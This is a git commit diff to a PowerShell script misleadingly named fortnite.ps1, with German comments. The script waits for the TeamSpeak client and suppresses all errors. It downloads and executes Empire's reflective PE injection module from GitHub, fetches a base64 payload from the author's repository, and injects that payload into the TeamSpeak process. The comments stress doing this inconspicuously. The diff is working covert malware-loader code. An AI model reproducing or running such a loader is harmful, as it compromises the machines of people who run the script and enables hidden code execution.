96ec2914763af2d2f10b12f1ae53d0d0f4f1269b
spritezerosugar67 <apfelgamer1@gmail.com>
2026-01-08 19:52:19 +0100

    Update fortnite.ps1

--- fortnite.ps1
+++ fortnite.ps1
@@ -1,24 +1,28 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
-while (!(Get-Process ts3client_win64)) { 
-    Start-Sleep -Seconds 2 
-}
-
+# Warten auf TeamSpeak
+while (!(Get-Process ts3client_win64)) { Start-Sleep -Seconds 2 }
 Start-Sleep -Seconds 5 
 
 try {
     [Net.ServicePointManager]::SecurityProtocol = 3072
-    $wc = New-Object System.Net.WebClient
     
-    $l = $wc.DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1")
+    # 1. Loader unauffällig laden
+    $lUrl = "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1"
+    $l = (iwr -UseBasicParsing $lUrl).Content
     Invoke-Expression $l
 
-    $b = $wc.DownloadString("https://raw.githubusercontent.com/spritezerosugar67/johannesschwein/refs/heads/main/johannesschwein.txt")
+    # 2. Payload unauffällig laden
+    $pUrl = "https://raw.githubusercontent.com/spritezerosugar67/johannesschwein/refs/heads/main/johannesschwein.txt"
+    $b = (iwr -UseBasicParsing $pUrl).Content
+    
+    # Säubern des Strings (entfernt unsichtbare Zeichen, die den Fehler verursachen)
+    $b = $b.Trim()
     $rb = [System.Convert]::FromBase64String($b)
 
-    Invoke-ReflectivePEInjection -PEBytes $rb -ForceASLR
+    # 3. Injektion explizit auf TS3 ausrichten
+    $target = Get-Process ts3client_win64
+    Invoke-ReflectivePEInjection -PEBytes $rb -ProcId $target.Id -ForceASLR
 } catch {
 }
-
-# Khiro wer das liest LG
 exit
